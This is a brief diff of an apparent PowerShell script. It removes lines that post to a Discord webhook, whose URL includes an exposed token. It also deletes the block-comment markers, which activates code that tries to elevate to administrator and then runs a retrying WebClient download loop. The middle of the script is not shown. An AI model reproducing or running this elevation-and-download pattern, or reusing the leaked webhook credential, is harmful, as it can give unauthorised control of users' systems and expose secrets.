@@ -1,10 +1,3 @@
-$webhookUrl = "https://discord.com/api/webhooks/1406275854169804891/ajy1l1F8b6tVNEV0_zB_SMQumHG82o54uOavEq-_HQE4Yyp7cu39OtF7IxVNLTQfqeRV"
-$body = @{
-    content = "Hello"
-} | ConvertTo-Json
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
-<## Attempt to elevate to administrative privileges if not already admin
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     try {
@@ -183,4 +176,3 @@ while (-not $success -and $retryCount -lt $maxRetries) {
         if ($webClient) { $webClient.Dispose() }
     }
 }
-#>
